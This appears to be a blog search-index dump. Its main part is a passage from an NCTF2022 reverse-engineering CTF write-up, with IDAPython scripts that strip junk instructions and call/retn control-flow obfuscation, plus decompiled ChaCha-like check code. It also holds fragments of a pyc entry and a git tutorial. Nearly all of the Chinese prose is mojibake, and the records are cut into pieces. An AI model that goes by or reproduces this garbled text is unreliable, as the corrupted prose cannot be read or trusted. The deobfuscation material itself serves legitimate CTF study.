0x1090 end = 0xB000 def nop(start_addr, len): patch_bytes(start_addr, b'\\x90' * len) for i in range(start, end): if get_bytes(i, 4) == b'SRZ[': nop(i, 4) if get_bytes(i, 6) == b'PSRZ[X': nop(i, 6) if get_bytes(i, 2) == b'RZ': nop(i, 2) if get_bytes(i, 4) == b'PRZX': nop(i, 4) if get_bytes(i, 2) == b'PX': nop(i, 2) if get_bytes(i, 2) == b'S[': nop(i, 2) if get_bytes(i, 4) == b'PS[X': nop(i, 4) if get_bytes(i, 4) == b'RPXZ': nop(i, 4) ","date":"2022-12-10","objectID":"/2022/12/nctf2022-ccccha-wp/:1:1","tags":["CTF","reverse"],"title":"NCTF2022 ccccha èŠ±æŒ‡ä»¤/æ··æ·† è¯¦è§£","uri":"/2022/12/nctf2022-ccccha-wp/"},{"categories":["WriteUps"],"content":"2. ç»å…¸0xe8 pushfq push rax cmp rax, 2022h ja short near ptr loc_1311+2 jle short near ptr loc_1311+2 call near ptr 489D6BFEh è§£å†³æ–¹æ¡ˆï¼šä»pushfqåˆ°ä¸¤ä¸ª0xe8å…¨éƒ¨nopæ‰ï¼Œä»¥åŠä¸¤ä¸ª0xe8åé¢æ˜¯pop raxå’Œpopfqï¼Œä¹Ÿä¸€å—æ‰¬äº†ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š start = 0x1090 end = 0xB000 def nop(start_addr, len): patch_bytes(start_addr, b'\\x90' * len) for i in range(start, end): if get_bytes(i, 16) == b'\\x9cPH=\" \\x00\\x00w\\x04~\\x02\\xe8\\xe8X\\x9d': nop(i, 16) ","date":"2022-12-10","objectID":"/2022/12/nctf2022-ccccha-wp/:1:2","tags":["CTF","reverse"],"title":"NCTF2022 ccccha èŠ±æŒ‡ä»¤/æ··æ·† è¯¦è§£","uri":"/2022/12/nctf2022-ccccha-wp/"},{"categories":["WriteUps"],"content":"3. ä¿®æ”¹å‡½æ•°è¿”å›åœ°å€å¹¶åˆ©ç”¨retnè·³è½¬ push rbx push rbx pushfq call $+5 pop rbx add rbx, 3Fh mov [rsp+16], rbx popfq pop rbx retn call $+5æ˜¯åŸåœ°callï¼Œä½†åŒæ—¶ä¼šå°†ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼ˆå³pop rbxï¼‰çš„åœ°å€å‹å…¥æ ˆï¼Œæ­£å¸¸æ—¶ä½œä¸ºè°ƒç”¨ç»“æŸæ—¶çš„è¿”å›åœ°å€ã€‚ä½†ä¸‹ä¸€å¥pop rbxç›´æ¥å°†å…¶å–å‡ºæ”¾å…¥rbxï¼Œç´§æ¥ç€å¯¹rbxåŠ ä¸Šä¸€ä¸ªå€¼ï¼Œç„¶åè¦†ç›–rsp+16ã€‚åé¢ä¸¤å¥ä¸¤ä¸ªpopï¼Œæ¯æ¬¡rsp+8ï¼Œæ­£å¥½è®©åŸå…ˆrsp+16å¤„çš„å€¼ä½äºæ ˆé¡¶ã€‚æ­¤æ—¶æ‰§è¡Œretnï¼Œå°±ä¼šè·³è½¬åˆ°æ ˆé¡¶çš„è¿™ä¸ªåœ°å€ã€‚æ•´ä¸ªè¿‡ç¨‹ç”¨gdbè°ƒè¯•ä¸€ä¸‹ä¼šçœ‹å¾—æ›´æ¸…æ¥šã€‚ æ­£æ˜¯è¿™ç§å¥‡æ€ªçš„è·³è½¬æ–¹å¼è®©IDAæ— æ³•è¯†åˆ«ç›®æ ‡åœ°å€ï¼Œå½¢æˆäº†æ§åˆ¶æµæ··æ·†ï¼Œä¹Ÿå°±æ— æ³•F5ã€‚æƒ³è¦ä¿®å¤è¿™ä¸ªæ§åˆ¶æµï¼Œæˆ‘ä»¬éœ€è¦æŠŠè¿™ç§éšå¼çš„è·³è½¬å˜æˆæ˜¾å¼çš„jmpè·³è½¬ï¼Œå³å¯è®©IDAæ›´å¥½åœ°åˆ†æ æ¥ä¸‹æ¥éš¾é¢˜å°±å˜æˆäº†å¦‚ä½•æ„é€ jmpæŒ‡ä»¤ï¼Œè¿™é‡Œéœ€è¦æˆ‘ä»¬å¯¹æ±‡ç¼–å’Œæœºå™¨ç æœ‰ä¸€ä¸ªæ›´æ·±çš„ç†è§£ï¼Œä¸‹é¢ä¸¾ä¾‹è¯´æ˜ï¼š 48 81 C3 3F 00 00 00æ˜¯add rbx, 3Fhçš„æœºå™¨ç ï¼Œå…¶ä¸­å‰ä¸‰å­—èŠ‚48 81 C3è¡¨ç¤ºadd rbxï¼Œåå››å­—èŠ‚3F 00 00 00æ˜¯æ‰€åŠ çš„ç«‹å³æ•°3Fh 48 83 C3 82æ˜¯add rbx, 0FFFFFFFFFFFFFF82hçš„æœºå™¨ç ï¼Œå¯è§å½“æ“ä½œæ•°ä¸ºè´Ÿæ•°æ—¶ï¼Œaddçš„æœºå™¨ç ç”±81å˜ä¸º83ï¼ŒåŒæ—¶å‚æ•°å€¼å˜æˆäº†ä½ä¸€å­—èŠ‚ jmpå‘½ä»¤çš„æœºå™¨ç æœ‰ä¸‰ç§ EB 8ä½offsetï¼šçŸ­è·³è½¬ï¼ˆshort jumpï¼‰è·³è½¬åˆ°256å­—èŠ‚çš„èŒƒå›´å†… E9 16/32ä½offsetï¼šè¿‘è·³è½¬ï¼ˆnear jumpï¼‰å¯è·³è½¬åˆ°åŒä¸€ä¸ªæ®µå†…çš„ä»»æ„åœ°å€ EA ptr 16:16/32ï¼šè¿œè·³è½¬ï¼ˆfar jumpï¼‰å¯è·³è½¬åˆ°ç¨‹åºä¸­ä»»æ„åœ°å€ æ­¤å¤„æˆ‘ä»¬é€‰æ‹©E9ï¼Œå¹¶ä¸”å‚æ•°ä¸º32ä½offsetï¼ˆç›¸å¯¹EIPçš„åç§»ï¼‰ patchè„šæœ¬ï¼š start = 0x1090 end = 0xB000 for i in range(start, end): # ç¬¬ä¸€ç§add if get_bytes(i, 12) == b'SS\\x9c\\xe8\\x00\\x00\\x00\\x00[H\\x81\\xc3' and get_bytes(i+16, 8) == b'H\\x89\\\\$\\x10\\x9d[\\xc3': offset = int.from_bytes(get_bytes(i+12, 4), 'little') + 3 # +3 æ˜¯ç”±äºpatchåjmpçš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ä¸åŸæ¥callçš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ç›¸å·®3 patch_bytes(i, b'\\xe9' + offset.to_bytes(4, 'little') + b'\\x90' * 19) # ç¬¬äºŒç§add if get_bytes(i, 12) == b'SS\\x9c\\xe8\\x00\\x00\\x00\\x00[H\\x83\\xc3' and get_bytes(i+13, 8) == b'H\\x89\\\\$\\x10\\x9d[\\xc3': offset = (int.from_bytes(get_bytes(i+12, 1), 'little') | 0xffffff00) + 3 patch_bytes(i, b'\\xe9' + offset.to_bytes(4, 'little') + b'\\x90' * 16) patchå®Œæˆä¹‹åidaä»æ— æ³•æ˜¾ç¤ºä¸å¯¹åŠ²ï¼Œæ­¤æ—¶éœ€è¦patch program applyä¸€ä¸‹ï¼Œç„¶åé‡æ–°æ‰“å¼€IDAåŠ è½½ç¨‹åºï¼Œå³å¯æ­£ç¡®åç¼–è¯‘å‡ºä¼ªä»£ç ï¼Œå¦‚ä¸‹ï¼š __int64 __fastcall sub_8DED() { __int64 v0; // rbp int i; // [rsp+10h] [rbp-140h] _DWORD v3[44]; // [rsp+18h] [rbp-138h] BYREF __int64 v4; // [rsp+CBh] [rbp-85h] BYREF int v5; // [rsp+D3h] [rbp-7Dh] char v6; // [rsp+D7h] [rbp-79h] _QWORD v7[4]; // [rsp+D8h] [rbp-78h] BYREF char v8; // [rsp+F8h] [rbp-58h] _QWORD v9[5]; // [rsp+108h] [rbp-48h] BYREF __int16 v10; // [rsp+130h] [rbp-20h] unsigned __int64 v11; // [rsp+140h] [rbp-10h] __int64 v12; // [rsp+148h] [rbp-8h] v12 = v0; v11 = __readfsqword(0x28u); v7[0] = 0x6A05A2805023EE57LL; v7[1] = 0x12CFEBEC73124005LL; v7[2] = 0xF060C3D29ED918C4LL; v7[3] = 0x45613036DB175B72LL; v4 = 0x143D83BD8A1337E6LL; v5 = -1868846699; v9[0] = 0x23CE4B73757CC05ELL; v9[1] = 0x708F01F3AC89BBA4LL; v9[2] = 0x62D45B4183317FC8LL; v9[3] = 0x4B50FC9DDC27A7A6LL; v9[4] = 0x385117386B2F9806LL; v10 = -4305; v8 = 0; v6 = 0; puts(\"input:\"); sub_8941(); if ( strlen(s1) != 42 ) { printf(\"Wrong!\"); exit(0); } sub_1090(v3, v7, \u0026v4, 0x9E3779B9); sub_1F33(v3); for ( i = 0; i \u003c= 41; ++i ) { s1[i] ^= *((_BYTE *)v3 + i); s1[i] += i; } if ( !memcmp(s1, v9, 0x2AuLL) ) printf(\"Right!\"); else printf(\"Wrong!\"); return 0LL; } void __fastcall sub_1090(_DWORD *a1, _DWORD *a2, _DWORD *a3, int a4) { memcpy(a1 + 16, a2, 0x20uLL); memcpy(a1 + 24, a3, 0xCuLL); qmemcpy(a1 + 28, \"expand 32-byte k\", 16); a1[32] = *a2; a1[33] = a2[1]; a1[34] = a2[2]; a1[35] = a2[3]; a1[36] = a2[4]; a1[37] = a2[5]; a1[38] = a2[6]; a1[39] = a2[7]; a1[40] = a4; a1[41] = *a3; a1[42] = a3[1]; a1[43] = a3[2]; } void __fastcall sub_1F33(_DWORD *a1) { int i; // [rsp+24h] [rbp-1Ch] int j; // [rsp+28h] [rbp-18h] int k; // [rsp+2Ch] [rbp-14h] for ( i = 0; i \u003c= 15; ++i ) a1[i] = a1[i + 28]; for ( j = 0; j \u003c= 9; ++j ) { printf(\" \\b\"); *a1 += a1[4]; a1[12] = __ROL4__(a1[12] ^ *a1, 16); a1[8] += a1[12]; a1[4] = __ROL4__(a1[4] ^ a1[8], 12); *a1 += a1[4]; a1[12] = __ROL4__(a1[12] ^ *a1, 8); a1[8] += a1[12]; a1[4] = __ROL4__(a1[4] ^ a1[8], 7); a1[1] += a1[5]; a1[13] = __ROL4__(a1[13] ^ a1[1], 16); a1[9] += a1[13]; a1[5] = __ROL4__(a1[5] ^ a1[9], 12); a1[1] += a1[5]; a1[13] = __ROL4__(a1[13] ^ a1[1], 8); a1[9] += a1[13]; a1[5] = __ROL4__(a1[5] ^ a1[9], 7); a1[2] += a1[6]; a1[14] = __ROL4__(a1[14] ^ a1[2], 16); a1[10] += a1[14]; a1[6] = __ROL4__(a1[6] ^ a1[10], 12); a1[2] += a1[6]; a1[14] = __ROL4__(a1[14] ^ a1[2], 8); a1[10] += a1[14]; a1[6] = __ROL4__(a1[6] ^ a1[10], 7); a1[3] += a1[7]; a1[15] = __ROL4__(a1[15] ^ a1[3], 16); a1[11] += a1[15]; a1[7] = __ROL4__(a1[7] ^ a1[11], 12); a1[3] += a1[7]; a1[15] = __ROL4__(a1[15] ","date":"2022-12-10","objectID":"/2022/12/nctf2022-ccccha-wp/:1:3","tags":["CTF","reverse"],"title":"NCTF2022 ccccha èŠ±æŒ‡ä»¤/æ··æ·† è¯¦è§£","uri":"/2022/12/nctf2022-ccccha-wp/"},{"categories":["Binary"],"content":"pycæ–‡ä»¶ç®€æ ","date":"2022-12-05","objectID":"/2022/12/python%E5%AD%97%E8%8A%82%E7%A0%81%E8%8A%B1%E6%8C%87%E4%BB%A4/:1:0","tags":["python","reverse"],"title":"[TODO]pycã€å­—èŠ‚ç ä¸èŠ±æŒ‡ä»¤","uri":"/2022/12/python%E5%AD%97%E8%8A%82%E7%A0%81%E8%8A%B1%E6%8C%87%E4%BB%A4/"},{"categories":["Binary"],"content":"pycæ˜¯ä»€ä¹ˆï¼Ÿ å½“æˆ‘ä»¬åœ¨ä»£ç ä¸­importå¦å¤–çš„pythonæ–‡ä»¶æ—¶ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªç›¸åº”çš„pycæ–‡ä»¶ï¼ˆpython3ä¼šå°†å…¶æ”¾åœ¨__pycache__æ–‡ä»¶å¤¹ä¸­ï¼‰ï¼Œè¿™æ˜¯ python code objectçš„æŒä¹…åŒ–å‚¨å­˜æ–¹å¼ï¼Œèƒ½å¤ŸåŠ é€Ÿä¸‹ä¸€æ¬¡çš„è£…è½½ï¼Œæé«˜è¿è¡Œæ•ˆç‡ã€‚ ","date":"2022-12-05","objectID":"/2022/12/python%E5%AD%97%E8%8A%82%E7%A0%81%E8%8A%B1%E6%8C%87%E4%BB%A4/:1:1","tags":["python","reverse"],"title":"[TODO]pycã€å­—èŠ‚ç ä¸èŠ±æŒ‡ä»¤","uri":"/2022/12/python%E5%AD%97%E8%8A%82%E7%A0%81%E8%8A%B1%E6%8C%87%E4%BB%A4/"},{"categories":["Binary"],"content":"Rreference https://bbs.pediy.com/thread-270901.htm#msg_header_h1_1 ","date":"2022-12-05","objectID":"/2022/12/windows-r3%E5%B8%B8%E8%A7%81hook%E6%80%BB%E7%BB%93/:1:0","tags":["windows","reverse"],"title":"[TODO]windows R3 å¸¸è§hookæ–¹å¼","uri":"/2022/12/windows-r3%E5%B8%B8%E8%A7%81hook%E6%80%BB%E7%BB%93/"},{"categories":["Dev"],"content":"ç‰ˆæœ¬æ§åˆ¶ï¼ˆgitï¼‰ ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:0:0","tags":["git"],"title":"ç‰ˆæœ¬æ§åˆ¶ï¼ˆgitï¼‰","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"ä¸ºä»€ä¹ˆéœ€è¦ç‰ˆæœ¬æ§åˆ¶ æ–¹ä¾¿ç®¡ç†ä¸åŒåŠŸèƒ½çš„å¤šä¸ªç‰ˆæœ¬ æ–¹ä¾¿å‡ºé—®é¢˜åå›æ»š æ–¹ä¾¿å¤šäººåä½œ ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:1:0","tags":["git"],"title":"ç‰ˆæœ¬æ§åˆ¶ï¼ˆgitï¼‰","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"gitæ•°æ®æ¨¡å‹ ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:2:0","tags":["git"],"title":"ç‰ˆæœ¬æ§åˆ¶ï¼ˆgitï¼‰","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"#è¦å­˜ä»€ä¹ˆï¼Ÿ ç›®å½•ç»“æ„ï¼ˆtreeï¼‰ æ–‡ä»¶è¯¦ç»†å†…å®¹ï¼ˆblobå¯¹è±¡/æ•°æ®å¯¹è±¡ï¼‰ å„ä¸ªç‰ˆæœ¬/æäº¤çš„å†å²è®°å½•ï¼ˆsnapå¿«ç…§ï¼‰ å†å²è®°å½•å…³è”/å…ˆåé¡ºåºï¼ˆæœ‰å‘æ— ç¯å›¾ï¼‰ o \u003c-- o \u003c-- o \u003c-- o \u003c---- o ^ / \\ v --- o \u003c-- o ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:2:1","tags":["git"],"title":"ç‰ˆæœ¬æ§åˆ¶ï¼ˆgitï¼‰","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"#ä¼ªä»£ç è¡¨ç¤º // æ–‡ä»¶å°±æ˜¯ä¸€ç»„æ•°æ® type blob = array\u003cbyte\u003e // ä¸€ä¸ªåŒ…å«æ–‡ä»¶å’Œç›®å½•çš„ç›®å½• type tree = map\u003cstring, tree | blob\u003e // æ¯ä¸ªæäº¤éƒ½åŒ…å«ä¸€ä¸ªçˆ¶è¾ˆï¼Œå…ƒæ•°æ®å’Œé¡¶å±‚æ ‘ type commit = struct { parent: array\u003ccommit\u003eÂ // çˆ¶èŠ‚ç‚¹ author: stringÂ // ä½œè€… message: stringÂ // æäº¤ä¿¡æ¯ snapshot: treeÂ // ç›®å½•ç»“æ„ } ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:2:2","tags":["git"],"title":"ç‰ˆæœ¬æ§åˆ¶ï¼ˆgitï¼‰","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"#å¯¹è±¡å’Œå†…å­˜å¯»å€ åœ¨gitä¸­blobã€treeã€commitéƒ½æ˜¯objectï¼ˆå¯¹è±¡ï¼‰ gitåœ¨å­˜å‚¨æ•°æ®æ—¶ï¼Œæ‰€æœ‰çš„å¯¹è±¡éƒ½ä¼šåŸºäºä»–ä»¬çš„SHA1æ•£åˆ—å€¼ï¼ˆé€šå¸¸ä¸º40ä½16è¿›åˆ¶å€¼ï¼‰è¿›è¡Œå¯»å€ï¼Œç”±æ­¤ä»»æ„ä¸€ä¸ªæäº¤éƒ½ä¼šè¢«ä¸€ä¸²å­—ç¬¦ä¸²å”¯ä¸€æ ‡è¯† ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:2:3","tags":["git"],"title":"ç‰ˆæœ¬æ§åˆ¶ï¼ˆgitï¼‰","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"#ä¸€äº›ç‰¹æ®Šçš„å¼•ç”¨ SHA1è¿ç®—çš„ç»“æœ40ä½16è¿›åˆ¶æ•°éš¾ä»¥è®°å¿†ï¼Œæ‰€ä»¥ä¸ºäº†æ›´åŠ æ–¹ä¾¿çš„è·å–ä¸€äº›å¯¹è±¡çš„åœ°å€ï¼Œgitå¯¹ä¸€äº›å“ˆå¸Œèµ‹äºˆäº†äººç±»å¯è¯»çš„åå­—ï¼Œå«åšå¯¹è±¡çš„å¼•ç”¨ï¼Œå¸¸è§çš„å¼•ç”¨æœ‰ï¼š HEADï¼šæŒ‡å‘å½“å‰å·¥ä½œåŒºæ‰€åœ¨çš„åˆ†æ”¯/æäº¤ master/mainï¼šä»“åº“ä¸»åˆ†æ”¯ originï¼šè¿œç¨‹ä»“åº“ ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:2:4","tags":["git"],"title":"ç‰ˆæœ¬æ§åˆ¶ï¼ˆgitï¼‰","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"æ˜ç¡®gitå’Œgithubçš„å…³ç³» git ä¸ä¾èµ–äº github å­˜åœ¨ã€‚ githubå¯ä»¥ä½œä¸ºä¸€ä¸ªè¿œç¨‹gitä»“åº“ï¼Œè¿›è¡Œä»£ç æ‰˜ç®¡ï¼Œæ–¹ä¾¿å¤šäººåä½œ ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:3:0","tags":["git"],"title":"ç‰ˆæœ¬æ§åˆ¶ï¼ˆgitï¼‰","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"gitæœ¬åœ°åŸºæœ¬å·¥ä½œæµ ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:4:0","tags":["git"],"title":"ç‰ˆæœ¬æ§åˆ¶ï¼ˆgitï¼‰","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"#ä¸‰ä¸ªåŒºåŸŸ æœ¬åœ°ç›®å½•ï¼ˆå·¥ä½œåŒºï¼‰ æ‰“å¼€æ–‡ä»¶å¤¹å®é™…çœ‹åˆ°çš„ æš‚å­˜åŒºï¼ˆç´¢å¼•åŒºï¼‰ åœ¨æ–‡ä»¶è¢«æäº¤è‡³æœ¬åœ°ä»“åº“ä¹‹å‰æ‰€å¤„çš„ä½ç½® æœ¬åœ°ä»“åº“ï¼ˆ.gitæ–‡ä»¶å¤¹ï¼‰ å­˜å‚¨ç€å„ç§å†å²ç‰ˆæœ¬ ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:4:1","tags":["git"],"title":"ç‰ˆæœ¬æ§åˆ¶ï¼ˆgitï¼‰","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"#æ“ä½œæµç¨‹ åˆå§‹åŒ–gitä»“åº“ git init æ–°å»º/ä¿®æ”¹/åˆ é™¤æ–‡ä»¶ vim/rm/... git statusï¼šæŸ¥çœ‹gitä»“åº“çŠ¶æ€ æŠŠæ–‡ä»¶æ·»åŠ åˆ°æš‚å­˜åŒº git add ä¸ºä»€ä¹ˆéœ€è¦æš‚å­˜åŒºï¼Ÿ æ‚¨å¼€å‘äº†ä¸¤ä¸ªç‹¬ç«‹çš„ç‰¹æ€§ï¼Œç„¶åæ‚¨å¸Œæœ›åˆ›å»ºä¸¤ä¸ªç‹¬ç«‹çš„æäº¤ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªæäº¤ä»…åŒ…å«ç¬¬ä¸€ä¸ªç‰¹æ€§ï¼Œè€Œç¬¬äºŒä¸ªæäº¤ä»…åŒ…å«ç¬¬äºŒä¸ªç‰¹æ€§ã€‚ ç®€å•æ¥è¯´å°±æ˜¯å¯ä»¥è‡ªç”±åœ°æ§åˆ¶æäº¤çš„å†…å®¹ï¼Œä½¿ç”¨æ›´çµæ´» å°†æš‚å­˜åŒºä¸­çš„æ–‡ä»¶æäº¤åˆ°æœ¬åœ°ä»“åº“ git commitÂ git logï¼šæŸ¥çœ‹commitä¿¡æ¯ etcâ€¦ ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:4:2","tags":["git"],"title":"ç‰ˆæœ¬æ§åˆ¶ï¼ˆgitï¼‰","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"git branchï¼ˆåˆ†æ”¯ï¼‰ ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:5:0","tags":["git"],"title":"ç‰ˆæœ¬æ§åˆ¶ï¼ˆgitï¼‰","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"#ä¸ºä»€ä¹ˆéœ€è¦åˆ†æ”¯ï¼Ÿ éš”ç¦»å¼€å‘ä¸»çº¿ï¼Œç¡®è®¤æ— è¯¯åå†è¿›è¡Œåˆ†æ”¯åˆå¹¶ åˆ†ç¦»ä¸åŒåŠŸèƒ½ï¼Œä½¿ç‰ˆæœ¬ç®¡ç†æ›´æœ‰æ¡ç† å¤šäººåä½œæ›´æ–¹ä¾¿ ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:5:1","tags":["git"],"title":"ç‰ˆæœ¬æ§åˆ¶ï¼ˆgitï¼‰","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"#å‘½ä»¤è¡Œæ“ä½œ è¯¦ç»†è¯·çœ‹git help branchï¼Œè¿™é‡Œä»…è¿›è¡Œç®€å•ç½—åˆ— git branch -vï¼šæŸ¥çœ‹ç°æœ‰åˆ†æ”¯ git branch ï¼šåˆ›å»ºåˆ†æ”¯ git checkout ï¼šåˆ‡æ¢åˆ†æ”¯ git merge ï¼šåˆå¹¶åˆ†æ”¯ ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:5:2","tags":["git"],"title":"ç‰ˆæœ¬æ§åˆ¶ï¼ˆgitï¼‰","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"git remoteï¼ˆè¿œç¨‹ä»“åº“ï¼‰ å°†ä»£ç ä¿å­˜åœ¨è¿œç¨‹ä»“åº“ï¼Œæ–¹ä¾¿å¤šäººåä½œï¼Œæ–¹ä¾¿ä»–äººæ‹‰å–ä»£ç  ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:6:0","tags":["git"],"title":"ç‰ˆæœ¬æ§åˆ¶ï¼ˆgitï¼‰","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"#æ˜ç¡® git remoteä»“åº“ä¸ æœ¬åœ°ä»“åº“ æ˜¯å®Œå…¨ä¸€æ ·çš„ç»“æ„ï¼Œä¸€æ ·æœ‰commit/branchç­‰æ¦‚å¿µ æ³¨æ„å¦‚æœåœ¨æœ¬åœ°åˆ›å»ºäº†æ–°åˆ†æ”¯ï¼Œè¿œç¨‹ä»“åº“ä¹Ÿéœ€è¦åˆ›å»ºæ–°åˆ†æ”¯ï¼ˆä¸€èˆ¬æ˜¯pushåŒæ—¶åˆ›å»ºæ–°åˆ†æ”¯ï¼‰ ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:6:1","tags":["git"],"title":"ç‰ˆæœ¬æ§åˆ¶ï¼ˆgitï¼‰","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"#å‘½ä»¤è¡Œæ“ä½œ git remote -vï¼šæŸ¥çœ‹è¿œç¨‹ä»“åº“ä¿¡æ¯ git remote add ï¼šæ·»åŠ ä¸€ä¸ªè¿œç¨‹ä»“åº“ git remote rm ï¼šåˆ é™¤ä¸€ä¸ªè¿œç¨‹ä»“åº“ git clone ï¼šå…‹éš†ä¸€ä¸ªè¿œç¨‹ä»“åº“åˆ°æœ¬åœ° git push :ï¼šå‘è¿œç¨‹ä»“åº“æ¨é€ä»£ç  git fetch ï¼šä»è¿œç¨‹ä»“åº“æ‹‰å–ä»£ç  git pull = git fetch + git merge ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:6:2","tags":["git"],"title":"ç‰ˆæœ¬æ§åˆ¶ï¼ˆgitï¼‰","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"gitå¸¸è§åœºæ™¯ ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:7:0","tags":["git"],"title":"ç‰ˆæœ¬æ§åˆ¶ï¼ˆgitï¼‰","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"#æœ¬åœ°åˆå§‹åŒ–ä»“åº“æäº¤åˆ°github git initåˆå§‹åŒ–gitä»“åº“ æ³¨æ„æ·»åŠ .gitignoreæ–‡ä»¶å¿½ç•¥éšç§æ–‡ä»¶ã€å¤šä½™æ–‡ä»¶ git addã€git commitâ€¦ git push åˆ°è¿œç¨‹ä»“åº“ ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:7:1","tags":["git"],"title":"ç‰ˆæœ¬æ§åˆ¶ï¼ˆgitï¼‰","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"#cloneè¿œç¨‹ä»“åº“å¹¶åœ¨æœ¬åœ°ç¼–è¾‘ å¤åˆ¶è¿œç¨‹ä»“åº“url æœ¬åœ°è¿›è¡Œgit clone è¿›è¡Œå¼€å‘ pushåˆ°è¿œç¨‹ä»“åº“ ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:7:2","tags":["git"],"title":"ç‰ˆæœ¬æ§åˆ¶ï¼ˆgitï¼‰","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"#forkä»“åº“å¹¶å‘èµ·pr(pull request) æœ¬åœ°æ‹‰å–githubä»“åº“ åˆ›å»ºæ–°åˆ†æ”¯ï¼Œåœ¨æ–°åˆ†æ”¯ä¸Šè¿›è¡Œå¼€å‘ pushåˆ°githubä»“åº“ æäº¤pr, ç­‰å¾…åŸä»“åº“ç®¡ç†å‘˜åˆå¹¶ ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:7:3","tags":["git"],"title":"ç‰ˆæœ¬æ§åˆ¶ï¼ˆgitï¼‰","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"tips ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:8:0","tags":["git"],"title":"ç‰ˆæœ¬æ§åˆ¶ï¼ˆgitï¼‰","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"#æ’¤é”€commit æœªpushåˆ°remote git reset â€“soft æŠŠcommitæ’¤é”€åˆ°æš‚å­˜åŒº git reset â€“mixed æŠŠcommitæ’¤é”€åˆ°å·¥ä½œåŒºï¼ˆåŒæ—¶æ’¤é”€git commitå’Œgit addï¼‰ å·²pushåˆ°remote git reset â€“hard 